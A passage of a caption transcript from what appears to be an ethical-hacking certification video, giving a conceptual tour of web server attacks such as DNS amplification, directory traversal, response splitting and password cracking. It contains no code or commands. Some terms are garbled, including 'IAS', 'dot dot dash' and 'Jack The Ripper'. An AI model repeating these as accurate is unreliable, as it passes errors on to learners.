that.\n\n259\n00:11:17.600 --> 00:11:21.400\nBut certainly compromising of user\naccounts can be a long term problem if we\n\n260\n00:11:21.400 --> 00:11:23.250\ndon't realize those accounts\nhave been modified.\n\n261\n00:11:23.250 --> 00:11:26.390\nCreation of shadow accounts,\nanother issue that can occur there.\n\n262\n00:11:26.390 --> 00:11:29.906\nSecondary attacks can be launched so\nthat website can now be taken over and\n\n263\n00:11:29.906 --> 00:11:32.468\nused as an orbital platform\nto launch other attacks.\n\n264\n00:11:32.468 --> 00:11:35.996\nRoot access can be gained to other\napplications and servers from there.\n\n265\n00:11:35.996 --> 00:11:38.170\nData tampering and data theft.\n\n266\n00:11:38.170 --> 00:11:40.410\nAll sorts of things can go wrong, right?\n\n267\n00:11:40.410 --> 00:11:42.370\nAnd so that's just something to consider.\n\n268\n00:11:42.370 --> 00:11:44.920\nWe have to, I didn't mean to cut you off,\nI'm sorry, just quickly.\n\n269\n00:11:44.920 --> 00:11:48.895\nWe have two competitive platforms that\nwe often traditionally think about in\n\n270\n00:11:48.895 --> 00:11:50.590\nthe web server space today.\n\n271\n00:11:50.590 --> 00:11:53.860\nIt's important for\nus as certified ethical hackers\n\n272\n00:11:53.860 --> 00:11:56.370\nto understand that we have\nthe Linux Unix world.\n\n273\n00:11:56.370 --> 00:11:58.280\nLinux is really what\nwe're talking about here.\n\n274\n00:11:58.280 --> 00:12:01.440\nThe Apache web server is what we\ntraditionally talk about there.\n\n275\n00:12:01.440 --> 00:12:02.580\nAnd on the Windows world, or\n\n276\n00:12:02.580 --> 00:12:04.454\nin the Microsoft world,\nalmost like Wayne's World.\n\n277\n00:12:04.454 --> 00:12:06.460\n&gt;&gt; [LAUGH]\n&gt;&gt; There's another great movie, right?\n\n278\n00:12:06.460 --> 00:12:08.710\nMicrosoft's world, we have IAS.\n\n279\n00:12:08.710 --> 00:12:10.670\nBeen around for a very long time now.\n\n280\n00:12:10.670 --> 00:12:14.490\nAnd so we need to think about the fact\nthat although they are both web servers\n\n281\n00:12:14.490 --> 00:12:17.008\nthey do approach their thought\nprocess slightly differently.\n\n282\n00:12:17.008 --> 00:12:20.510\nSo there are differences in architecture,\nthere are differences in architecture and\n\n283\n00:12:20.510 --> 00:12:22.720\ndesign, in implementation.\n\n284\n00:12:22.720 --> 00:12:25.700\nAt the end of the day, nuts and\nbolts stuff, a user's a user, right,\n\n285\n00:12:25.700 --> 00:12:26.920\nsecurity is security.\n\n286\n00:12:26.920 --> 00:12:30.850\nBut the implementation and\nthe architecture is different.\n\n287\n00:12:30.850 --> 00:12:34.090\nAnd as a result,\nwe have to consider that as part of the.\n\n288\n00:12:34.090 --> 00:12:34.840\nYou wanna make a comment?\n\n289\n00:12:34.840 --> 00:12:35.620\nI didn't mean to cut you off.\n\n290\n00:12:35.620 --> 00:12:36.280\n&gt;&gt; No, that's okay.\n\n291\n00:12:36.280 --> 00:12:39.225\nI was just thinking as we're\ntalking about this, the web server,\n\n292\n00:12:39.225 --> 00:12:41.390\nalmost seems like\na double-edged sword there.\n\n293\n00:12:41.390 --> 00:12:45.110\nWe really need it to have our enterprise,\nour company.\n\n294\n00:12:45.110 --> 00:12:49.600\nIf you don't have a web presence,\nyou're not in the e-commerce today.\n\n295\n00:12:49.600 --> 00:12:50.890\n&gt;&gt; Very true.\n\n296\n00:12:50.890 --> 00:12:54.310\n&gt;&gt; And the problem is it seems that that\nweb server has to have some level of\n\n297\n00:12:54.310 --> 00:12:56.070\nexposure to the world wide web.\n\n298\n00:12:56.070 --> 00:12:58.980\nTo get the people,\ncustomers to come into our site.\n\n299\n00:12:58.980 --> 00:13:02.620\nBut it also has to be attached\nto our backend to pull data,\n\n300\n00:13:02.620 --> 00:13:05.500\nto fill in that product catalog or\nthose descriptions.\n\n301\n00:13:05.500 --> 00:13:08.140\nServices running on it that\nhave access to our back ends.\n\n302\n00:13:09.280 --> 00:13:11.810\nSo it's like I have to put it out there.\n\n303\n00:13:11.810 --> 00:13:15.350\nBut man, it's a risk to put it out\nthere because if it becomes compromised\n\n304\n00:13:15.350 --> 00:13:17.980\nit's the key to the kingdom\nif they can get through it.\n\n305\n00:13:19.095 --> 00:13:20.345\n&gt;&gt; It is, it is.\n\n306\n00:13:20.345 --> 00:13:24.055\nAnd it's a great point that you\nraise because one of the problems\n\n307\n00:13:24.055 --> 00:13:25.015\nthat we struggle with.\n\n308\n00:13:25.015 --> 00:13:26.585\nAnd this is not a new problem and\n\n309\n00:13:26.585 --> 00:13:31.297\nMike is sitting on one of the ancient\nmysteries of information security.\n\n310\n00:13:31.297 --> 00:13:32.762\nWhen they unearth, right?\n\n311\n00:13:32.762 --> 00:13:34.537\n&gt;&gt; [LAUGH]\n&gt;&gt; The original pyramid and\n\n312\n00:13:34.537 --> 00:13:37.597\nevidence of aliens having come\ndown to set up our internet.\n\n313\n00:13:37.597 --> 00:13:40.387\nAnd they found out that Steve Jobs\nwas actually from Venus or\n\n314\n00:13:40.387 --> 00:13:41.262\nsomething like that.\n\n315\n00:13:41.262 --> 00:13:43.218\n&gt;&gt; [LAUGH]\n&gt;&gt; What they're gonna find seating next to\n\n316\n00:13:43.218 --> 00:13:46.740\nthe Rosetta Stone that explains all this\nis a question that basically sounds very\n\n317\n00:13:46.740 --> 00:13:48.215\nsimilar to what Mike just posed.\n\n318\n00:13:48.215 --> 00:13:50.479\nWhich is, how do you build a secure web?\n\n319\n00:13:50.479 --> 00:13:52.946\nRight?\nBecause the problem is an ancient one,\n\n320\n00:13:52.946 --> 00:13:54.640\nit is as old as computing itself.\n\n321\n00:13:54.640 --> 00:13:59.790\nThe minute we created two computers,\ndecided somehow to link them together and\n\n322\n00:14:00.920 --> 00:14:02.930\nto allow them to communicate.\n\n323\n00:14:02.930 --> 00:14:04.268\nThat was a problem in and of itself, but\n\n324\n00:14:04.268 --> 00:14:07.200\nwe could control that because\nit was very close, right?\n\n325\n00:14:07.200 --> 00:14:08.200\nVery easy to understand.\n\n326\n00:14:08.200 --> 00:14:11.500\nThere's one point over here,\none point over here,\n\n327\n00:14:11.500 --> 00:14:13.330\nhow we linked the two together securely.\n\n328\n00:14:13.330 --> 00:14:16.180\nIf we monitor that connection\nwe can keep an eye on that.\n\n329\n00:14:16.180 --> 00:14:20.552\nBut the minute we started exposing this\nbroadly and widely allowing others outside\n\n330\n00:14:20.552 --> 00:14:24.246\nof that initial network to connect\ntheir networks up to our networks.\n\n331\n00:14:24.246 --> 00:14:25.055\nGotta stop doing that.\n\n332\n00:14:25.055 --> 00:14:27.341\n&gt;&gt; [LAUGH]\n&gt;&gt; Our networks, and as a result of that,\n\n333\n00:14:27.341 --> 00:14:29.049\nthat's just me not paying attention.\n\n334\n00:14:29.049 --> 00:14:31.687\n&gt;&gt; [LAUGH]\n&gt;&gt; My depth perception is just off today.\n\n335\n00:14:31.687 --> 00:14:36.169\nAnd so when we started inviting\nessentially others to link up.\n\n336\n00:14:36.169 --> 00:14:39.684\nNow all of a sudden, this is really\nwhere we start to run into this issue.\n\n337\n00:14:39.684 --> 00:14:44.918\nWhich is, how do we provide information\nsecurely inside of our networks?\n\n338\n00:14:44.918 --> 00:14:48.253\nBut then propagate that,\nallow that in theory, in some respects and\n\n339\n00:14:48.253 --> 00:14:50.460\nin some ways limited though they may be.\n\n340\n00:14:50.460 --> 00:14:53.120\nTo be exposed to the outside world and\ndo that securely as well?\n\n341\n00:14:53.120 --> 00:14:55.950\nAnd this is probably the oldest question.\n\n342\n00:14:55.950 --> 00:14:57.510\nThe oldest issue.\n\n343\n00:14:57.510 --> 00:14:59.040\nThis is really the bedrock,\n\n344\n00:14:59.040 --> 00:15:02.650\nthe foundational quandary that\nwe have in information security.\n\n345\n00:15:02.650 --> 00:15:05.425\nIf we could figure this out,\nyou and I could retire.\n\n346\n00:15:05.425 --> 00:15:07.180\nI mean, that would be it right now.\n\n347\n00:15:07.180 --> 00:15:08.465\n&gt;&gt; Now, what we're doing this weekend.\n\n348\n00:15:08.465 --> 00:15:09.925\n&gt;&gt; Well we could take Titus with us,\nright?\n\n349\n00:15:09.925 --> 00:15:10.640\n&gt;&gt; Yeah.\n[LAUGH]\n\n350\n00:15:10.640 --> 00:15:12.045\n&gt;&gt; Cuz he wants to retire too.\n\n351\n00:15:12.045 --> 00:15:13.495\nI know he does, he's excited.\n\n352\n00:15:13.495 --> 00:15:15.066\nHe can go Pokemon full time.\n\n353\n00:15:15.066 --> 00:15:16.377\nThat would be his new gig.\n\n354\n00:15:16.377 --> 00:15:18.507\nHe'd be the Pokemon master.\n\n355\n00:15:18.507 --> 00:15:19.532\n&gt;&gt; He would be the master trainer.\n\n356\n00:15:19.532 --> 00:15:20.947\n[LAUGH]\n&gt;&gt; He would be the master trainer.\n\n357\n00:15:20.947 --> 00:15:22.957\n&gt;&gt; We'll just start calling him Ash.\n\n358\n00:15:22.957 --> 00:15:23.827\n&gt;&gt; Or just call him MT.\n\n359\n00:15:23.827 --> 00:15:24.547\n&gt;&gt; MT.\nMaster Trainer.\n\n360\n00:15:24.547 --> 00:15:25.187\n&gt;&gt; Yeah.\n\n361\n00:15:25.187 --> 00:15:26.517\nOr Master Titus.\n\n362\n00:15:26.517 --> 00:15:27.077\n&gt;&gt; Master Titus.\n\n363\n00:15:27.077 --> 00:15:28.577\n&gt;&gt; [LAUGH] One or the other.\n\n364\n00:15:28.577 --> 00:15:29.206\nOr MTT.\n\n365\n00:15:29.206 --> 00:15:30.150\nMaster Titer Trainus.\n\n366\n00:15:30.150 --> 00:15:30.930\n&gt;&gt; [LAUGH] There we go.\n\n367\n00:15:30.930 --> 00:15:32.430\n&gt;&gt; All right, anyway, so.\n\n368\n00:15:32.430 --> 00:15:35.690\nWhat we're thinking about here, and\nit's a great observation, as I said,\n\n369\n00:15:35.690 --> 00:15:38.340\nthat Mike made, is how do we\nsecurely put the stuff out there?\n\n370\n00:15:38.340 --> 00:15:39.210\nHow do we connect?\n\n371\n00:15:39.210 --> 00:15:40.180\nHow do we allow?\n\n372\n00:15:40.180 --> 00:15:43.750\nThis is what the whole conversation,\nnot just here, but in any of our episodes.\n\n373\n00:15:43.750 --> 00:15:45.470\nAcross all of the CEH knowledge,\n\n374\n00:15:45.470 --> 00:15:48.400\nthat we're putting out there has really\nbeen about in one form or another.\n\n375\n00:15:48.400 --> 00:15:51.979\nThink about it, everything we've touched\non has been, hey there's something there,\n\n376\n00:15:51.979 --> 00:15:53.658\nlet's defend it, let's figure it out.\n\n377\n00:15:53.658 --> 00:15:57.688\nThis is how we're gonna break it, this\nis how potentially you need to look for\n\n378\n00:15:57.688 --> 00:15:59.059\nus coming into attack it.\n\n379\n00:15:59.059 --> 00:16:00.936\nAnd this is what you've gotta\nbe on guard against, right?\n\n380\n00:16:00.936 --> 00:16:03.347\nAnd this is really all the same\nstuff we've been talking about.\n\n381\n00:16:03.347 --> 00:16:05.912\nThings like DoS and\nDDoS attacks against web servers.\n\n382\n00:16:05.912 --> 00:16:09.139\nWe've talked a lot about those and\nwhy they're not only fun and exciting but\n\n383\n00:16:09.139 --> 00:16:10.960\nthey can also be very problematic.\n\n384\n00:16:10.960 --> 00:16:11.950\nWe've actually shown you.\n\n385\n00:16:11.950 --> 00:16:12.980\nI've shown you.\n\n386\n00:16:12.980 --> 00:16:16.120\nJointly, we have shown you\nhow to execute DOS and\n\n387\n00:16:16.120 --> 00:16:18.160\nDDoS attacks across some of\nthe episodes that we've done.\n\n388\n00:16:18.160 --> 00:16:19.870\nWe've talked about the concept.\n\n389\n00:16:19.870 --> 00:16:21.740\nRemember DoS, denial of service.\n\n390\n00:16:21.740 --> 00:16:23.220\nOne on one, we're fighting it out.\n\n391\n00:16:23.220 --> 00:16:24.260\nIt's like Fight Club, right?\n\n392\n00:16:24.260 --> 00:16:24.900\n&gt;&gt; Mano a mano.\n\n393\n00:16:24.900 --> 00:16:25.820\n&gt;&gt; Mano a mano.\n\n394\n00:16:25.820 --> 00:16:27.356\nAnd another great movie, Fight Club.\n\n395\n00:16:27.356 --> 00:16:29.020\nNot mano e mano,\nI've never seen that movie,\n\n396\n00:16:29.020 --> 00:16:31.290\nI have no idea what that\nmovie may be about.\n\n397\n00:16:31.290 --> 00:16:33.380\nIf there's even one that exists and\nI'm sure there probably is.\n\n398\n00:16:33.380 --> 00:16:35.940\nI was talking about Fight Club,\nnot about mano a mano.\n\n399\n00:16:35.940 --> 00:16:39.015\nBut DDoS,\ndistributed denial of service, right?\n\n400\n00:16:39.015 --> 00:16:43.365\nBasically a whole group of people coming\nin and trying to attack one machine or\n\n401\n00:16:43.365 --> 00:16:45.765\nperhaps a small segment of machines.\n\n402\n00:16:45.765 --> 00:16:49.285\nBut that's everybody ganging up and\ntrying to take the machine out so\n\n403\n00:16:49.285 --> 00:16:50.667\nwe have to be able to\ndifferentiate between.\n\n404\n00:16:50.667 --> 00:16:56.487\nI'm just gonna talk about an interesting\nkind of DDoS attack in a little while,\n\n405\n00:16:56.487 --> 00:16:59.357\nDNS amplification attack and\nyou'll take a look at that.\n\n406\n00:16:59.357 --> 00:17:00.667\nThat's always kind of exciting.\n\n407\n00:17:00.667 --> 00:17:03.027\nSo DNS server hijacking can be used.\n\n408\n00:17:03.027 --> 00:17:03.747\nWe can poison, and\n\n409\n00:17:03.747 --> 00:17:07.660\nwe've talked about this in other episodes,\npoison the DNS resolver cache.\n\n410\n00:17:07.660 --> 00:17:09.100\nCreate fake host files.\n\n411\n00:17:09.100 --> 00:17:12.460\nWe can go in and manipulate DNS servers so\nwe're not running DNS sec and\n\n412\n00:17:12.460 --> 00:17:15.785\npotentially insert false references,\nor false records, rather.\n\n413\n00:17:15.785 --> 00:17:16.900\n&gt;&gt; Mm-hm.\n&gt;&gt; That could be used, or\n\n414\n00:17:16.900 --> 00:17:19.190\nwe could just take over\nthe DNS server overall.\n\n415\n00:17:19.190 --> 00:17:20.120\nHijack it.\n\n416\n00:17:20.120 --> 00:17:22.710\nThis is something to consider,\nso we gotta be aware of that.\n\n417\n00:17:22.710 --> 00:17:25.880\nI did mention we would talk about\nDNS amplification in just a minute.\n\n418\n00:17:25.880 --> 00:17:27.342\nAnd I'm about 20 seconds early, so no.\n\n419\n00:17:27.342 --> 00:17:28.720\n&gt;&gt; [LAUGH]\n&gt;&gt; No, we gotta be on target.\n\n420\n00:17:28.720 --> 00:17:31.640\nIt's very important we live\nup to our expectations when\n\n421\n00:17:31.640 --> 00:17:32.810\nwe say something to people.\n\n422\n00:17:32.810 --> 00:17:35.010\nWe're gonna sit quietly for\nthe next 15 seconds.\n\n423\n00:17:35.010 --> 00:17:36.570\n&gt;&gt; I'll search for Mano a Mano, the movie.\n\n424\n00:17:36.570 --> 00:17:40.070\n&gt;&gt; You could do that, but we're gonna\nhave a small timeout while we sit and\n\n425\n00:17:40.070 --> 00:17:42.170\nwait until amplification\nattacks are available.\n\n426\n00:17:42.170 --> 00:17:44.530\nNow we're gonna go and take a look, and\nI know Mike actually has something.\n\n427\n00:17:44.530 --> 00:17:50.295\nI actually asked Mike to look\nspecifically at or search for a little\n\n428\n00:17:50.295 --> 00:17:53.190\nhow-to on DNS amplification attacks for\nyou that's actually pretty cool.\n\n429\n00:17:53.190 --> 00:17:56.350\nIt's put up by US-CERT, so\nthe computer mercy response team,\n\n430\n00:17:56.350 --> 00:17:59.960\nthe US government which is now under\nHomeland Security, where all good stuff\n\n431\n00:17:59.960 --> 00:18:04.420\nis, and they have a great little primer\non amplification attacks out there.\n\n432\n00:18:04.420 --> 00:18:05.080\nYou have that up for us?\n\n433\n00:18:05.080 --> 00:18:06.200\nCould we put that up real quick?\n\n434\n00:18:06.200 --> 00:18:09.700\nSo this is kind of cool and\nI know you'll post the URL for it.\n\n435\n00:18:09.700 --> 00:18:11.070\n&gt;&gt; I will.\n&gt;&gt; So everybody will see it.\n\n436\n00:18:11.070 --> 00:18:14.980\nAnd if you're not familiar with an\namplification attack on, can you zoom in\n\n437\n00:18:14.980 --> 00:18:17.700\nso we could see that overview statement,\nit's actually just it's so eloquent.\n\n438\n00:18:17.700 --> 00:18:19.960\nIt's just little,\nit's right there, maybe not.\n\n439\n00:18:19.960 --> 00:18:22.008\nSo let me just,\nyou could see it but not really.\n\n440\n00:18:22.008 --> 00:18:26.610\nSo, you know, the idea behind it right\nIs essentially that you're gonna\n\n441\n00:18:26.610 --> 00:18:28.580\nuse a DNS server, right?\n\n442\n00:18:28.580 --> 00:18:32.520\nYou're gonna create a Distributed Denial\nof Service attack by doing this.\n\n443\n00:18:32.520 --> 00:18:35.175\nYou are gonna set up a bunch\nof individuals, right?\n\n444\n00:18:35.175 --> 00:18:36.380\n&gt;&gt; Mm-hm.\n\n445\n00:18:36.380 --> 00:18:42.460\n&gt;&gt; That are going to come and respond to\na single machine with DNS information.\n\n446\n00:18:42.460 --> 00:18:44.660\nThey're gonna amplify the DNS requests.\n\n447\n00:18:44.660 --> 00:18:46.350\nAnd by flooding in all at once,\n\n448\n00:18:46.350 --> 00:18:49.570\nthey're gonna try to overwhelm this\none machine that you're targeting.\n\n449\n00:18:49.570 --> 00:18:52.115\nSo it is like a tidal wave of DNS,\nor a DNS tsunami,\n\n450\n00:18:52.115 --> 00:18:54.310\nright, of information that comes back.\n\n451\n00:18:54.310 --> 00:18:54.840\n&gt;&gt; I like that.\n&gt;&gt; So\n\n452\n00:18:54.840 --> 00:18:57.490\nan amplification attack is\nessentially just a DDoS attack\n\n453\n00:18:57.490 --> 00:19:00.480\nwhere we use publicly\naccessible OpenDNS servers and\n\n454\n00:19:00.480 --> 00:19:04.280\nwe flood the target system with response\ntraffic trying to take it offline.\n\n455\n00:19:04.280 --> 00:19:05.480\n&gt;&gt; Wow.\n&gt;&gt; So it's actually cool.\n\n456\n00:19:05.480 --> 00:19:06.090\nThey talk about it here.\n\n457\n00:19:06.090 --> 00:19:09.140\nIt's got a great little summary,\na little primer on how it works,\n\n458\n00:19:09.140 --> 00:19:12.890\nthe impact that you may have,\nhow to detect it, which is why I like it.\n\n459\n00:19:12.890 --> 00:19:15.370\nThey talk about OpenDNS,\nwhich I've talked about before,\n\n460\n00:19:15.370 --> 00:19:17.115\non using the OpenDNS project.\n\n461\n00:19:17.115 --> 00:19:19.700\nThey talk about the measurement\nfactory in there,\n\n462\n00:19:19.700 --> 00:19:22.750\nwhich is another list of\ninternet accessible DNS servers.\n\n463\n00:19:22.750 --> 00:19:24.570\nDNS inspect is mentioned in there.\n\n464\n00:19:24.570 --> 00:19:26.020\nIt's actually a really neat little site.\n\n465\n00:19:26.020 --> 00:19:27.900\nGives you a lot of\nreally good information.\n\n466\n00:19:27.900 --> 00:19:31.212\nSo it'd be good for you to take a look at,\nbut if I was you, I'd wanna know about DNS\n\n467\n00:19:31.212 --> 00:19:34.250\namplification attacks, so helpful for\nyou to take a look at that.\n\n468\n00:19:34.250 --> 00:19:37.200\nIt's sometime called a reflective\nattack or reflection attack.\n\n469\n00:19:37.200 --> 00:19:38.820\nIt's essentially the same kind of thing.\n\n470\n00:19:38.820 --> 00:19:40.950\nIt's a form of DDoS, so\njust be aware of that.\n\n471\n00:19:42.170 --> 00:19:42.830\nWe've got those.\n\n472\n00:19:42.830 --> 00:19:45.880\nWhat about one of my favorites, I know\nyou and I have talked about them before.\n\n473\n00:19:45.880 --> 00:19:49.150\nDirectory traversal attacks, or dot dot\ndash attacks, as they're sometimes called\n\n474\n00:19:49.150 --> 00:19:52.350\nor sometimes dot dot slash attacks,\nwhatever you would call them.\n\n475\n00:19:52.350 --> 00:19:57.230\nBut the idea is that we will walk through\nthe URL using additional dots and\n\n476\n00:19:57.230 --> 00:20:00.980\ndashes to represent directories and\nsub directories, and if the server or\n\n477\n00:20:00.980 --> 00:20:03.610\nthe website is not\npatched against this and\n\n478\n00:20:03.610 --> 00:20:07.990\nwe get the right level of access we can\nessentially walk the directory structure\n\n479\n00:20:07.990 --> 00:20:10.010\nlooking for hidden directories or files.\n\n480\n00:20:10.010 --> 00:20:12.820\nAnd speaking of hidden things I'm going to\nshow you that trick I told you about with\n\n481\n00:20:12.820 --> 00:20:14.290\nthe whole robots.txt thing.\n\n482\n00:20:14.290 --> 00:20:16.450\n&gt;&gt; Yes.\n&gt;&gt; That's kind of interesting and cool.\n\n483\n00:20:16.450 --> 00:20:17.317\nAnd so, you know,\n\n484\n00:20:17.317 --> 00:20:20.810\nthere's a lot of ways that we may\nexpose information inadvertently.\n\n485\n00:20:20.810 --> 00:20:23.070\nIf you think about what\noften goes out on websites.\n\n486\n00:20:23.070 --> 00:20:26.740\nWhat we don't think about is just\nthe volume of information that exists on\n\n487\n00:20:26.740 --> 00:20:27.450\nthese sites.\n\n488\n00:20:27.450 --> 00:20:31.135\nThere's picture files, there's text files,\nthere's all sorts of stuff, and\n\n489\n00:20:31.135 --> 00:20:34.895\nthis is put into directories to be able\nto associate it with the appropriate\n\n490\n00:20:36.215 --> 00:20:38.165\ninformation that we want to provide.\n\n491\n00:20:38.165 --> 00:20:40.645\nBut there may be other stuff\nin that server, right,\n\n492\n00:20:40.645 --> 00:20:42.335\nthat we may not want people to see.\n\n493\n00:20:42.335 --> 00:20:44.095\nIf we can get control,\n\n494\n00:20:44.095 --> 00:20:47.755\nwe can move through using essentially\nnothing about trial and error.\n\n495\n00:20:47.755 --> 00:20:51.185\nYou know, every dot represents,\nyou know, a file or directory, and\n\n496\n00:20:51.185 --> 00:20:53.785\nthen the slash, and then you're\nable to move through the hierarchy.\n\n497\n00:20:53.785 --> 00:20:57.310\nIf we can do that,\nwe may be able to get access to restricted\n\n498\n00:20:57.310 --> 00:21:01.720\nsystem areas outside the root web\ndirectory, www root, and get in there.\n\n499\n00:21:01.720 --> 00:21:07.455\nWe may be able to rick havoc and\nchaos, our goal and mission in life.\n\n500\n00:21:07.455 --> 00:21:08.129\n&gt;&gt; [LAUGHTER]\n&gt;&gt; So\n\n501\n00:21:08.129 --> 00:21:09.675\nthere's man in the middle\nsniffing attacks.\n\n502\n00:21:09.675 --> 00:21:12.350\nWe've talked about these before,\nwhy these can be problematic.\n\n503\n00:21:12.350 --> 00:21:15.660\nThere are phishing attacks that can be\nused through and against web servers.\n\n504\n00:21:15.660 --> 00:21:18.920\nThis is where you're going to get some\nsort of an email that's going to have\n\n505\n00:21:18.920 --> 00:21:23.350\na spoofed or a masqueraded link or\nsome sort of code in it that may execute\n\n506\n00:21:23.350 --> 00:21:26.960\nan attack, and if you click on it,\nwe can often steal credentials to do this.\n\n507\n00:21:26.960 --> 00:21:28.960\nYou know one of the big things\nthat you've got to look for\n\n508\n00:21:28.960 --> 00:21:30.690\nis URLs that are misspelled.\n\n509\n00:21:30.690 --> 00:21:33.930\nThat's one of the telltale signs,\nright, for phishing sites and\n\n510\n00:21:33.930 --> 00:21:36.310\nalso websites that you\nmay be redirected to.\n\n511\n00:21:36.310 --> 00:21:39.910\nIf something like Microsoft.com\nis misspelled with an o, or\n\n512\n00:21:39.910 --> 00:21:42.514\nrather misspelled with an o, cuz that's\nhow you would not spell it, right?\n\n513\n00:21:42.514 --> 00:21:43.870\n&gt;&gt; [LAUGH]\n&gt;&gt; If it's misspelled with a zero is\n\n514\n00:21:43.870 --> 00:21:45.070\nwhat I meant to say.\n\n515\n00:21:45.070 --> 00:21:47.940\nHow many of us would catch that, quite\nhonestly, if you think about it, right?\n\n516\n00:21:47.940 --> 00:21:51.290\nAnd it's so close that most of us would\nnot even realize or think about it.\n\n517\n00:21:51.290 --> 00:21:53.030\nGoogle, you know Google.com?\n\n518\n00:21:53.030 --> 00:21:55.690\nG o, 0, how would you know that?\n\n519\n00:21:55.690 --> 00:21:57.750\nOr Google with a 1 instead of an l?\n\n520\n00:21:57.750 --> 00:21:59.470\nRight, I mean, these things can happen.\n\n521\n00:21:59.470 --> 00:22:03.330\nAnd if we're not paying attention to them,\nit's very easy for them to get by us.\n\n522\n00:22:03.330 --> 00:22:06.850\nAnd if we don't have the active filtering\ntaking place to catch that kind of stuff,\n\n523\n00:22:06.850 --> 00:22:09.780\nthen we may wind up getting sucked in.\n\n524\n00:22:09.780 --> 00:22:12.690\nSo we do have to be careful because it's\nvery, it's one of the biggest issues we\n\n525\n00:22:12.690 --> 00:22:17.700\nhave today, is how this, these misspelled\nor misdirected websites are taking place.\n\n526\n00:22:17.700 --> 00:22:19.400\nWebsite defacement, we talked about that.\n\n527\n00:22:19.400 --> 00:22:22.770\nWebsite misconfiguration as\na possibility and an outcome here.\n\n528\n00:22:22.770 --> 00:22:25.450\nSomebody gets control of the website,\nthey can re-tool it.\n\n529\n00:22:25.450 --> 00:22:29.074\nThey may be able to turn on remote\nadmin functions, things like that.\n\n530\n00:22:29.074 --> 00:22:32.590\nSwap out certificates,\njust all sorts of stuff can go on.\n\n531\n00:22:32.590 --> 00:22:34.040\nSo better think about that.\n\n532\n00:22:34.040 --> 00:22:36.530\nWhat about HTTP response\nsplitting attacks?\n\n533\n00:22:36.530 --> 00:22:37.530\nThis is kinda interesting.\n\n534\n00:22:37.530 --> 00:22:40.050\nSo what we do here, this is almost like,\n\n535\n00:22:40.050 --> 00:22:43.240\nwell not almost like, this is similar to\nsome of the other attacks we talked about\n\n536\n00:22:43.240 --> 00:22:46.900\nin earlier episodes but we are able\nto respond to rather, excuse me,\n\n537\n00:22:46.900 --> 00:22:50.930\ntake the HTTP response and\nsplit it inside the response.\n\n538\n00:22:50.930 --> 00:22:53.360\nAnd we can split it into two parts.\n\n539\n00:22:53.360 --> 00:22:55.330\nAnd so one of the parts is\ncontrolled by the web server,\n\n540\n00:22:55.330 --> 00:22:57.070\nthe other is controlled by the bad actor.\n\n541\n00:22:57.070 --> 00:22:58.430\nAnd if we put exploit code,\n\n542\n00:22:58.430 --> 00:23:04.460\nlike a redirect to a URL into the part\nwe control and then we get the end user,\n\n543\n00:23:04.460 --> 00:23:07.900\nthe target, to actually execute the part\nwe control and ignore the part that's\n\n544\n00:23:07.900 --> 00:23:10.410\ncoming back from the web server,\nwe've essentially got them.\n\n545\n00:23:10.410 --> 00:23:13.070\nCuz now they go off, and\nthey are able to hit that website, and\n\n546\n00:23:13.070 --> 00:23:14.710\nwe actually tell them where to go.\n\n547\n00:23:14.710 --> 00:23:19.640\nSo, if we do something like set cookie,\nright, as a response, traditionally,\n\n548\n00:23:19.640 --> 00:23:23.160\nright, or rather we send back\nsomething with this cookie in the URL,\n\n549\n00:23:23.160 --> 00:23:26.430\nwe maybe able to respond or\nmodify that behaviour.\n\n550\n00:23:26.430 --> 00:23:27.920\nSo it's something to consider.\n\n551\n00:23:27.920 --> 00:23:29.970\nWe call those response splitting attacks.\n\n552\n00:23:29.970 --> 00:23:31.620\nKinda interesting.\n\n553\n00:23:31.620 --> 00:23:36.250\nThey are not hard to carry out but\nthey are sometimes a little challenging.\n\n554\n00:23:36.250 --> 00:23:38.700\nWeb cache poisoning,\nwe talked about this with DNS,\n\n555\n00:23:38.700 --> 00:23:43.710\nI was gonna say DRL DNS cache\nattacks where we can go in and\n\n556\n00:23:43.710 --> 00:23:48.530\nwe can poison the DNS cache and so\nweb cache poisoning could happen as well.\n\n557\n00:23:48.530 --> 00:23:52.780\nHistorical information could be poisoned,\nwe can load or pre load or\n\n558\n00:23:52.780 --> 00:23:56.830\ncontrol and modify bad URLs and\ndo all sorts of stuff there.\n\n559\n00:23:56.830 --> 00:23:58.441\nSSH brute force attacks.\n\n560\n00:23:58.441 --> 00:24:01.716\nWe could try to break SSH,\ndo web server pass for cracking,\n\n561\n00:24:01.716 --> 00:24:06.121\nmay be able to do that where we can go and\ntry to crack and attack those passwords.\n\n562\n00:24:06.121 --> 00:24:07.166\nThere's different techniques.\n\n563\n00:24:07.166 --> 00:24:09.220\nWe can do guessing Password guessing.\n\n564\n00:24:09.220 --> 00:24:10.524\nWe've talked about these\nin other episodes.\n\n565\n00:24:10.524 --> 00:24:14.110\nDictionary attacks,\nbrute force attacks, hybrid attacks.\n\n566\n00:24:14.110 --> 00:24:16.090\nGo back to the idea of L0phtCrack and\n\n567\n00:24:16.090 --> 00:24:18.850\nthe all in one Swiss Army knife\ntool that we talked about.\n\n568\n00:24:18.850 --> 00:24:22.520\nThere's pwdump, pwdump2,\nJack The Ripper, right?\n\n569\n00:24:22.520 --> 00:24:26.900\nThere's all this different stuff that\nyou can potentially take a look at.\n\n570\n00:24:26.900 --> 00:24:28.970\nI did not ask you to, and I apologize.\n\n571\n00:24:28.970 --> 00:24:31.930\nI know I wanted us to have\neverything preloaded.\n\n572\n00:24:31.930 --> 00:24:35.870\nBut we pulled up the OWASP top ten web\napplication vulnerability list before.\n\n573\n00:24:35.870 --> 00:24:38.020\nSo, that's gonna be pertinent here,\nas well.\n\n574\n00:24:38.020 --> 00:24:40.660\nWe're not gonna go through the whole\nthing, but Mike'll throw the URL in\n\n575\n00:24:40.660 --> 00:24:42.790\nthe chat window for you, again,\njust to make sure you have it.\n\n576\n00:24:42.790 --> 00:24:45.280\nYeah, but we've talked about\nthe importance of knowing all ten\n\n577\n00:24:45.280 --> 00:24:49.400\nof those attacks on the top ten list\nto help you prepare for the exam.\n\n578\n00:24:49.400 --> 00:24:51.380\nThere is cookie tampering.\n\n579\n00:24:51.380 --> 00:24:53.320\nThere is denial of service attacks.\n\n580\n00:24:53.320 --> 00:24:55.390\nTalk about a variety of\ndifferent things that are here.\n\n581\n00:24:55.390 --> 00:24:57.750\nDirectory traverse,\nI mentioned some of these.\n\n582\n00:24:57.750 --> 00:24:58.870\nSQL injection attacks,\n\n583\n00:24:58.870 --> 00:25:02.750\nwe have a whole set of episodes on SQL\ninjection,cross site scripting attacks.\n\n584\n00:25:02.750 --> 00:25:06.730\nWe did a big discussion\non that in our sniffing.\n\n585\n00:25:06.730 --> 00:25:10.820\nOr not in 